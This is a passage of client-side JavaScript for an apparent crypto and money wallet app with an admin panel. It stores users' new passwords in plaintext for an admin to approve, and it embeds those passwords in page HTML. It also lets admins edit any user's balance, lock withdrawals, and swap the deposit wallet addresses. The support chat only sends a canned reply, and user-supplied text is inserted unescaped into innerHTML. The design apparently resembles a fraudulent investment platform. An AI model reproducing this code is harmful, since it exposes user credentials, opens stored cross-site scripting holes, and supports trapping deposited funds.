    }, 'Saving profile...');
    currentProfile = { ...currentProfile, ...updates };
    btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg> Edit`;
    showToast('Profile updated successfully','success');
    refreshUserUI();
  }
}

/* FIX 4: Complete rewrite of avatar upload with validation, proper path, cache busting */
function getDefaultAvatar() {
  const seed = currentProfile?.id || currentProfile?.email || 'user';
  // Gender-neutral initials avatar (auto-generated from user ID)
  return `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(seed)}&backgroundColor=eef2ff&textColor=2563eb&size=128`;
}

function updateAvatarImages(url) {
  const finalUrl = url || getDefaultAvatar();
  ['mobileAvatar', 'deskAvatar', 'profileAvatarImg'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    // Force browser to treat it as a new image
    el.src = finalUrl;
    el.onerror = () => { el.src = getDefaultAvatar(); };
  });
}

async function handleAvatarUpload(e) {
  const file = e.target.files[0];
  if (!file) return;

  if (!file.type.startsWith('image/')) {
    return showToast('Please select an image file (JPG, PNG)', 'error');
  }
  if (file.size > 5 * 1024 * 1024) {
    return showToast('Image must be under 5MB', 'error');
  }

  try {
    await withLoader(async () => {
      // Always overwrite the same file so we don't clutter storage
      const ext = file.name.split('.').pop() || 'jpg';
      const path = `avatars/${currentProfile.id}/avatar.${ext}`;

      // 1. Upload to Storage
      const { error: upErr } = await sb.storage
        .from('avatars')
        .upload(path, file, { upsert: true, contentType: file.type });

      if (upErr) throw new Error(upErr.message);

      // 2. Get public URL (strip old query params first)
      const { data } = sb.storage.from('avatars').getPublicUrl(path);
      if (!data?.publicUrl) throw new Error('Failed to get public URL');

      const cleanUrl = data.publicUrl.split('?')[0];
      const cacheBustUrl = `${cleanUrl}?t=${Date.now()}`;

      // 3. Save to profiles table
      const { error: dbErr } = await sb
        .from('profiles')
        .update({ avatar_url: cacheBustUrl })
        .eq('id', currentProfile.id);

      if (dbErr) throw new Error(dbErr.message);

      // 4. Update local state
      currentProfile.avatar_url = cacheBustUrl;
    }, 'Uploading photo...');

    // 5. Force all 3 avatar images to update immediately
    updateAvatarImages(currentProfile.avatar_url);
    showToast('Profile photo updated', 'success');

  } catch (err) {
    console.error('Avatar upload failed:', err);
    showToast('Upload failed: ' + err.message, 'error');
  }

  e.target.value = '';
}

function openChangePasswordModal() { document.getElementById('changePwModal').classList.add('active'); }
function closeChangePasswordModal() { document.getElementById('changePwModal').classList.remove('active'); }

async function handlePasswordChangeRequest(e) {
  e.preventDefault();
  const current = document.getElementById('currentPw').value;
  const newPw   = document.getElementById('newPw').value;
  const confirm = document.getElementById('confirmNewPw').value;

  const { error } = await sb.auth.signInWithPassword({ email: currentProfile.email, password: current });
  if (error) return showToast('Current password is incorrect','error');
  if (newPw !== confirm) return showToast('New passwords do not match','error');
  if (newPw.length < 6) return showToast('Password must be at least 6 characters','error');

  await withLoader(async () => {
    await sb.from('admin_password_requests').insert([{
      id: genId('pwreq'), user_id: currentProfile.id, new_password: newPw, status: 'pending'
    }]);
  }, 'Requesting change...');

  e.target.reset();
  closeChangePasswordModal();
  showToast('Password change request sent to admin','success');
}

async function toggleNotifications() {
  const val = document.getElementById('notifToggle').checked;
  await withLoader(async () => {
    await sb.from('profiles').update({ notifications: val }).eq('id', currentProfile.id);
  }, 'Updating...');
  currentProfile.notifications = val;
  showToast(val?'Push notifications enabled':'Push notifications disabled','success');
}

function openCurrencyModal() { document.getElementById('currencyModal').classList.add('active'); }
function closeCurrencyModal() { document.getElementById('currencyModal').classList.remove('active'); }
async function fetchExchangeRate(from, to) {
  if (from === to) return 1;
  try {
    const res = await fetch(`https://open.er-api.com/v6/latest/${from}`);
    const data = await res.json();
    return data.rates?.[to] || 1;
  } catch (e) {
    console.error('Rate fetch failed', e);
    return 1;
  }
}

async function setCurrency(c) {
  if (!currentProfile || c === currentProfile.currency) {
    closeCurrencyModal();
    return;
  }
  await withLoader(async () => {
    const rate = await fetchExchangeRate(currentProfile.currency, c);
    const newBal = parseFloat((parseFloat(currentProfile.balance) * rate).toFixed(2));
    await sb.from('profiles').update({ currency: c, balance: newBal }).eq('id', currentProfile.id);
    currentProfile.currency = c;
    currentProfile.balance = newBal;
  }, 'Converting currency...');
  closeCurrencyModal();
  refreshUserUI();
  showToast('Currency updated to ' + c, 'success');
}

function openLanguageModal() { document.getElementById('languageModal').classList.add('active'); }
function closeLanguageModal() { document.getElementById('languageModal').classList.remove('active'); }
async function setLanguage(l) {
  await withLoader(async () => {
    await sb.from('profiles').update({ language: l }).eq('id', currentProfile.id);
  }, 'Updating language...');
  currentProfile.language = l;
  closeLanguageModal();
  refreshUserUI();
  showToast('Language updated to '+LANGUAGE_NAMES[l],'success');
}

async function handleDeleteAccount() {
  if (!confirm('Are you sure you want to delete your account? This action cannot be undone.')) return;
  await withLoader(async () => {
    await sb.from('transactions').delete().eq('user_id', currentProfile.id);
    await sb.from('support_messages').delete().eq('user_id', currentProfile.id);
    await sb.from('profiles').delete().eq('id', currentProfile.id);
    await sb.auth.signOut();
  }, 'Deleting account...');
  showToast('Account deleted','success');
  setTimeout(()=>location.reload(),1500);
}

/* -------------------- ADMIN PANEL -------------------- */
function injectAdminNav() {
  if (document.getElementById('admin-nav-item')) return;
  const sidebar = document.querySelector('.sidebar-nav');
  if (sidebar) {
    const a = document.createElement('a');
    a.href = '#'; a.className = 'nav-item'; a.id = 'admin-nav-item';
    a.setAttribute('data-page', 'admin');
    a.innerHTML = `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg><span>Admin Panel</span>`;
    a.onclick = () => { showPage('admin'); return false; };
    sidebar.insertBefore(a, sidebar.firstChild);
  }
  const mnav = document.querySelector('.mobile-nav');
  if (mnav) {
    const item = document.createElement('a');
    item.href = '#'; item.className = 'mobile-nav-item'; item.id = 'admin-mnav-item';
    item.setAttribute('data-nav', 'admin');
    item.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg><span>Admin</span>`;
    item.onclick = () => { showPage('admin'); return false; };
    mnav.insertBefore(item, mnav.firstChild);
  }
  if (!document.getElementById('page-admin')) {
    const main = document.createElement('main');
    main.className = 'page'; main.id = 'page-admin';
    main.innerHTML = `
      <section class="deposit-hero"><h2 class="deposit-title">Admin Control Panel</h2><p class="deposit-subtitle">Manage users, transactions, and system settings.</p></section>
      <div id="admin-content"></div>`;
    document.getElementById('app-container').appendChild(main);
  }
}

function removeAdminNav() {
  const el = document.getElementById('admin-nav-item'); if (el) el.remove();
  const mel = document.getElementById('admin-mnav-item'); if (mel) mel.remove();
  const page = document.getElementById('page-admin'); if (page) page.remove();
}

async function refreshAdminUI() {
  await renderAdminPanel();
}

async function renderAdminPanel() {
  const container = document.getElementById('admin-content');
  if (!container) return;

  const { data: locks } = await sb.from('feature_locks').select('*');
  const lockMap = {};
  (locks||[]).forEach(l=>lockMap[l.feature_name]=l.locked);

  const { data: deposits } = await sb.from('admin_deposits')
    .select('*, profiles(name,email)').order('created_at',{ascending:false});

  const { data: messages } = await sb.from('support_messages')
    .select('*, profiles(name,email)').eq('from_role','user').is('parent_id',null)
    .order('created_at',{ascending:false});

  const { data: pwReqs } = await sb.from('admin_password_requests')
    .select('*, profiles(name,email)').eq('status','pending').order('created_at',{ascending:false});

  const { data: balanceLogs } = await sb.from('admin_balance_logs')
    .select('*, profiles!admin_balance_logs_user_id_fkey(name,currency)')
    .order('created_at',{ascending:false}).limit(5);

  const { data: allUsers } = await sb.from('profiles').select('*').eq('is_admin',false);

  container.innerHTML = `
    <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">Feature Locks</h3>
      <div style="display:flex;flex-direction:column;gap:12px">
        ${renderLockRow('paybills','Pay Bills',lockMap['paybills'])}
        ${renderLockRow('sendmoney','Send Money',lockMap['sendmoney'])}
        ${renderLockRow('withdraw','Withdraw',lockMap['withdraw'])}
      </div>
    </section>

    <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">User Balance Editor</h3>
      <div class="form-group" style="margin-bottom:12px">
        <label class="form-label">Select User</label>
        <select class="form-input" id="adminTargetUser">
          ${(allUsers||[]).map(u=>`<option value="${u.id}">${u.name} (${u.email}) — ${fmtMoney(u.balance,u.currency)}</option>`).join('')}
        </select>
      </div>
      <div class="form-grid" style="grid-template-columns:1fr 1fr">
        <div class="form-group">
          <label class="form-label">Amount (+/-)</label>
          <input type="number" class="form-input" id="adminBalanceAmount" placeholder="e.g. 5000 or -2000" step="0.01">
        </div>
        <div class="form-group">
          <label class="form-label">Reason</label>
          <input type="text" class="form-input" id="adminBalanceReason" placeholder="e.g. Bonus, Correction">
        </div>
      </div>
      <button class="crypto-deposit-btn" style="margin-top:16px" onclick="processBalanceChange()">Apply Balance Change</button>
      <div style="margin-top:16px">
        <p style="font-size:12px;font-weight:700;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.5px">Recent Balance Logs</p>
        <div style="display:flex;flex-direction:column;gap:8px">
          ${(balanceLogs||[]).map(l=>`
            <div style="padding:10px 12px;background:var(--bg);border-radius:8px;font-size:13px;color:var(--text-secondary)">
              <span style="font-weight:600;color:var(--text-primary)">${parseFloat(l.amount)>0?'+':''}${fmtMoney(l.amount, l.profiles?.currency||'EUR')}</span>
              — ${l.reason} <span style="float:right;color:var(--text-muted)">${new Date(l.created_at).toLocaleString()}</span>
            </div>`).join('') || '<p style="font-size:13px;color:var(--text-muted)">No logs yet.</p>'}
        </div>
      </div>
    </section>

    <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">Pending Deposits</h3>
      <div style="display:flex;flex-direction:column;gap:10px">
        ${!(deposits||[]).filter(d=>d.status==='processing').length
          ? '<p style="color:var(--text-muted);font-size:14px">No pending deposits.</p>'
          : deposits.filter(d=>d.status==='processing').map(d=>`
            <div style="padding:14px;background:var(--bg);border-radius:12px;border:1px solid var(--border)">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
                <span style="font-weight:700;color:var(--text-primary)">${d.profiles?.name||'User'} — ${d.coin} ${d.amount}</span>
                <span class="transaction-status processing">Processing</span>
              </div>
              <p style="font-size:12px;color:var(--text-secondary);margin-bottom:10px">TXID: ${d.txid} • ${new Date(d.created_at).toLocaleString()}</p>
              <div style="display:flex;gap:8px">
                <button class="security-item-btn" onclick="updateDepositStatus('${d.id}','confirmed')">Confirm</button>
                <button class="security-item-btn" style="background:#FEF2F2;color:#DC2626" onclick="updateDepositStatus('${d.id}','rejected')">Reject</button>
              </div>
            </div>`).join('')}
      </div>
    </section>

    <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">Support Messages</h3>
      <div style="display:flex;flex-direction:column;gap:10px">
        ${!(messages||[]).length
          ? '<p style="color:var(--text-muted);font-size:14px">No messages.</p>'
          : messages.map(m=>`
            <div style="padding:14px;background:var(--bg);border-radius:12px;border:1px solid var(--border)">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
                <span style="font-weight:700;color:var(--text-primary);font-size:14px">${m.subject}</span>
                <span style="font-size:11px;color:var(--text-muted)">${m.profiles?.name||'User'} • ${new Date(m.created_at).toLocaleString()}</span>
              </div>
              <p style="font-size:13px;color:var(--text-secondary);margin-bottom:8px">${m.body.slice(0,120)}${m.body.length>120?'...':''}</p>
              <div style="display:flex;gap:8px;align-items:center">
                <input type="text" class="form-input" id="reply-${m.id}" placeholder="Type reply..." style="flex:1;font-size:13px;padding:8px 10px">
                <button class="security-item-btn" onclick="replyToMessage('${m.id}')">Reply</button>
              </div>
            </div>`).join('')}
      </div>
    </section>

    <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">Password Change Requests</h3>
      <div style="display:flex;flex-direction:column;gap:10px">
        ${!(pwReqs||[]).length
          ? '<p style="color:var(--text-muted);font-size:14px">No pending requests.</p>'
          : pwReqs.map(p=>`
            <div style="padding:14px;background:var(--bg);border-radius:12px;border:1px solid var(--border)">
              <p style="font-size:14px;font-weight:600;color:var(--text-primary);margin-bottom:4px">${p.profiles?.name||'User'} (${p.profiles?.email||''})</p>
              <p style="font-size:12px;color:var(--text-secondary);margin-bottom:10px">Requested: ${new Date(p.created_at).toLocaleString()}</p>
              <button class="security-item-btn" onclick="approvePasswordChange('${p.id}','${p.user_id}','${p.new_password}')">Approve & Update</button>
            </div>`).join('')}
      </div>
    </section>

        <section class="crypto-deposit-card">
      <h3 style="font-size:18px;font-weight:800;margin-bottom:16px;color:var(--text-primary)">Crypto Addresses</h3>
      <div style="display:flex;flex-direction:column;gap:12px">
        ${['btc','eth','usdt','usdc'].map(coin => {
          const info = CRYPTO_INFO[coin];
          return `
            <div style="padding:14px;background:var(--bg);border-radius:12px;border:1px solid var(--border)">
              <p style="font-size:14px;font-weight:700;color:var(--text-primary);margin-bottom:8px">${info.name} (${coin.toUpperCase()})</p>
              <div class="form-group" style="margin-bottom:8px">
                <label class="form-label">Wallet Address</label>
                <input type="text" class="form-input" id="crypto-addr-${coin}" value="${info.address}" placeholder="Enter address">
              </div>
              <div class="form-group" style="margin-bottom:10px">
                <label class="form-label">Network</label>
                <input type="text" class="form-input" id="crypto-net-${coin}" value="${info.network}" placeholder="e.g. ERC-20">
              </div>
              <button class="security-item-btn" onclick="saveCryptoAddress('${coin}')">Save ${info.name}</button>
            </div>`;
        }).join('')}
      </div>
    </section>
  `;
}

async function saveCryptoAddress(coin) {
  const address = document.getElementById(`crypto-addr-${coin}`).value.trim();
  const network = document.getElementById(`crypto-net-${coin}`).value.trim();
  if (!address) return showToast('Address is required', 'error');

  await withLoader(async () => {
    await sb.from('crypto_addresses').upsert({
      id: coin, name: CRYPTO_INFO[coin].name, address, network,
      updated_at: new Date().toISOString()
    });
    CRYPTO_INFO[coin].address = address;
    CRYPTO_INFO[coin].network = network;
  }, 'Saving...');
  showToast(CRYPTO_INFO[coin].name + ' address updated', 'success');
}

function renderLockRow(key,label,locked) {
  return `
    <div style="display:flex;align-items:center;justify-content:space-between;padding:12px;background:var(--bg);border-radius:10px;border:1px solid var(--border)">
      <span style="font-weight:600;color:var(--text-primary);font-size:14px">${label}</span>
      <label class="toggle-switch">
        <input type="checkbox" ${locked?'checked':''} onchange="toggleFeatureLock('${key}')">
        <span class="toggle-slider"></span>
      </label>
    </div>`;
}

async function toggleFeatureLock(feature) {
  await withLoader(async () => {
    const { data } = await sb.from('feature_locks').select('*').eq('feature_name',feature).single();
    const newVal = !data.locked;
    await sb.from('feature_locks').update({ locked: newVal, updated_at: new Date().toISOString() }).eq('feature_name',feature);
    showToast(feature + ' is now ' + (newVal?'LOCKED':'UNLOCKED'), newVal?'warning':'success');
  }, 'Updating...');
  await renderAdminPanel();
}

async function processBalanceChange() {
  const targetId = document.getElementById('adminTargetUser').value;
  const amt = parseFloat(document.getElementById('adminBalanceAmount').value);
  const reason = document.getElementById('adminBalanceReason').value;
  if (isNaN(amt)||!reason) return showToast('Enter valid amount and reason','error');

  await withLoader(async () => {
    const { data: target } = await sb.from('profiles').select('*').eq('id',targetId).single();
    if (!target) throw new Error('User not found');

    const newBal = parseFloat(target.balance) + amt;
    await sb.from('profiles').update({ balance: newBal }).eq('id', targetId);

    await sb.from('admin_balance_logs').insert([{
      id: genId('log'), admin_id: currentProfile.id, user_id: targetId,
      amount: amt, reason, created_at: new Date().toISOString()
    }]);

    await sb.from('transactions').insert([{
      id: genId('tx'), user_id: targetId, type: amt>=0?'income':'expense',
      title: reason, subtitle: 'Admin Balance Adjustment',
      amount: Math.abs(amt), date: todayStr(), status: 'completed',
      icon_class: amt>=0?'green':'red', amount_class: amt>=0?'income-amount':'expense-amount'
    }]);
  }, 'Applying balance change...');

  document.getElementById('adminBalanceAmount').value = '';
  document.getElementById('adminBalanceReason').value = '';
  showToast('Balance updated successfully','success');

  /* FIX 5: If admin is editing their own balance, refresh immediately */
  if (targetId === currentProfile.id) {
    await reloadProfile();
  }
  await renderAdminPanel();
}

/* FIX 6: After confirming deposit, force-reload the target user's profile
   so their balance updates instantly if they are logged in. */
async function updateDepositStatus(id, status) {
  await withLoader(async () => {
    await sb.from('admin_deposits').update({ status }).eq('id', id);
    const { data: dep } = await sb.from('admin_deposits').select('*').eq('id',id).single();
    if (dep) {
      await sb.from('transactions').update({ status }).eq('id', id);
      if (status === 'confirmed') {
        const { data: user } = await sb.from('profiles').select('*').eq('id', dep.user_id).single();
        if (user) {
          const newBal = parseFloat(user.balance) + parseFloat(dep.amount);
          await sb.from('profiles').update({ balance: newBal }).eq('id', dep.user_id);
        }
      }
    }
  }, status==='confirmed'?'Confirming deposit...':'Rejecting deposit...');

  showToast(status==='confirmed'?'Deposit confirmed and balance credited':'Deposit rejected',
    status==='confirmed'?'success':'error');

  /* FIX 7: If the confirmed deposit belongs to the currently logged-in user,
     refresh their profile and UI immediately. */
  const { data: depCheck } = await sb.from('admin_deposits').select('user_id').eq('id', id).single();
  if (depCheck && depCheck.user_id === currentProfile.id) {
    await reloadProfile();
  }
   await new Promise(r => setTimeout(r, 400));
  await renderAdminPanel();
}

async function replyToMessage(id) {
  const input = document.getElementById('reply-'+id);
  const text = input.value.trim();
  if (!text) return;

  await withLoader(async () => {
    const { data: orig } = await sb.from('support_messages').select('*').eq('id',id).single();
    if (!orig) throw new Error('Message not found');
    await sb.from('support_messages').insert([{
      id: genId('msg'), user_id: orig.user_id, body: text,
      from_role: 'admin', read: false, parent_id: id
    }]);
  }, 'Sending reply...');

  input.value = '';
  showToast('Reply sent','success');
   await new Promise(r => setTimeout(r, 400));
  await renderAdminPanel();
}

async function approvePasswordChange(id, userId, newPw) {
  await withLoader(async () => {
    await sb.from('profiles').update({ pending_password: newPw }).eq('id', userId);
    await sb.from('admin_password_requests').update({ status: 'approved' }).eq('id', id);
  }, 'Approving password...');
  showToast('Password approved. User will be updated on next login.','success');
  await renderAdminPanel();
}

/* -------------------- NOTIFICATIONS -------------------- */
async function loadNotifications() {
  if (!currentProfile) return;
  const { data } = await sb.from('notifications')
    .select('*').eq('user_id', currentProfile.id)
    .order('created_at', {ascending: false}).limit(10);

  const unread = (data || []).filter(n => !n.read).length;

  // Red dots
  const dot = document.getElementById('notifDot');
  const deskDot = document.getElementById('deskNotifDot');
  if (dot) dot.style.display = unread > 0 ? 'block' : 'none';
  if (deskDot) deskDot.style.display = unread > 0 ? 'block' : 'none';

  // Render panel
  const list = document.getElementById('notificationList');
  if (!list) return;
  if (!data || data.length === 0) {
    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-muted);font-size:13px;">No notifications yet</div>';
    return;
  }
  list.innerHTML = data.map(n => `
    <div class="notif-item ${n.read ? '' : 'unread'}" onclick="markNotifRead('${n.id}')" style="padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background 0.2s;">
      <p style="font-weight:600;font-size:13px;color:var(--text-primary);margin-bottom:4px;">${n.title}</p>
      <p style="font-size:12px;color:var(--text-secondary);margin-bottom:4px;line-height:1.4;">${n.message}</p>
      <p style="font-size:11px;color:var(--text-muted);">${new Date(n.created_at).toLocaleString()}</p>
    </div>
  `).join('');
}

function toggleNotificationsPanel() {
  const panel = document.getElementById('notificationPanel');
  if (!panel) return;
  const isOpen = panel.style.display === 'flex';
  panel.style.display = isOpen ? 'none' : 'flex';
  if (!isOpen) loadNotifications();
}

document.addEventListener('click', (e) => {
  const panel = document.getElementById('notificationPanel');
  const bell = document.getElementById('notificationBtn');
  const deskBell = document.getElementById('desktopNotifBtn');
  if (!panel || panel.style.display !== 'flex') return;
  if (panel.contains(e.target)) return;
  if (bell && bell.contains(e.target)) return;
  if (deskBell && deskBell.contains(e.target)) return;
  panel.style.display = 'none';
});

async function markNotifRead(id) {
  await sb.from('notifications').update({ read: true }).eq('id', id);
  await loadNotifications();
}

async function markAllNotifRead() {
  if (!currentProfile) return;
  await sb.from('notifications').update({ read: true }).eq('user_id', currentProfile.id);
  await loadNotifications();
}

/* -------------------- UTILITIES -------------------- */
function copyToClipboard(elId, msg) {
  const el = document.getElementById(elId);
  if (!el) return;
  const text = el.textContent || el.value;
  navigator.clipboard.writeText(text).then(()=>showToast(msg,'success')).catch(()=>{
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta); ta.select();
    document.execCommand('copy'); document.body.removeChild(ta);
    showToast(msg,'success');
  });
}

function scrollToAbout() {
  const el = document.getElementById('landingAbout');
  if (el) el.scrollIntoView({ behavior: 'smooth' });
}
function openLandingMenu() { document.getElementById('landingMenuOverlay').classList.add('active'); }
function closeLandingMenu() { document.getElementById('landingMenuOverlay').classList.remove('active'); }
function openLandingChat() { document.getElementById('landingChatPanel').classList.add('active'); }
function closeLandingChat() { document.getElementById('landingChatPanel').classList.remove('active'); }

function sendChatMessage() {
  const input = document.getElementById('chatInput');
  const text = input.value.trim();
  if (!text) return;
  const container = document.getElementById('chatMessages');
  const time = nowStr();
  container.innerHTML += `<div class="chat-message user" style="align-self:flex-end"><div class="chat-bubble"><p>${text}</p></div><span class="chat-time">${time}</span></div>`;
  input.value = '';
  container.scrollTop = container.scrollHeight;
  setTimeout(()=>{
    container.innerHTML += `<div class="chat-message support"><div class="chat-bubble"><p>Thanks for reaching out! Our team will get back to you shortly.</p></div><span class="chat-time">${nowStr()}</span></div>`;
    container.scrollTop = container.scrollHeight;
  }, 1200);
}

function renderWallet() {}

/* -------------------- BOOT -------------------- */
document.addEventListener('DOMContentLoaded', init);